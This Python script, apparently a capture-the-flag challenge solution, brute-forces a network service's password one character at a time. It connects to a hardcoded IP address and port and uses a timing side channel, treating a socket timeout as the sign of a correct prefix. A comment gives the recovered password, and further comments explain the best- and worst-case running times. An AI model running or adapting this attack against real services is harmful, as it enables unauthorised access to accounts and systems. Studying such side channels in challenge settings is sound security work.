import socket

ALPHABET = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'
HOST = '143.0.100.198'
PORT = 60123

def createSocket(tm) -> socket:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  s.settimeout(tm)
  return s

def recv(s, sz = 4096):
  return s.recv(sz).decode()

def send(s, msg):
  s.send(msg.encode())

password = "" # GaAVCK9r3K

while(1):
  for x in ALPHABET:
    # Each character is checked roughly in one second
    with createSocket(len(password) + 2) as s:
      recv(s)
      send(s, password + x)
      try:
        msg = recv(s)
        if(msg == u''):
          continue
        print('Congratulations message?', msg)
        print('The password is', password + x)
        exit(0)
      except socket.timeout:
        print('Found character', x)
        password += x

# bestTime = O(n^2), where n is the number of characters of the password. Why?
# When you send a string with length x, you need to wait for x seconds,
# Therefore if every message sent is correct, you will wait
# 1 + 2 + 3 + ... + n seconds = n * (n + 1) / 2 seconds

# worstTime = O(n^2) with big constant (52 times more compared to best case),
# where n is the number of characters of the password. Why?
# Similar reasons to the best case, but this time you'll never guess correctly,
# except for the last time on the current char, therefore, you need to wait for
# 52 + 52 * 2 + 52 * 3 + ... + 52 * n seconds = 52 * n * (n + 1) / 2 seconds

# With n = 10, the amount of time of waiting will go from 45 seconds (in best case)
# to 1 hour and 11 minutes (worst case)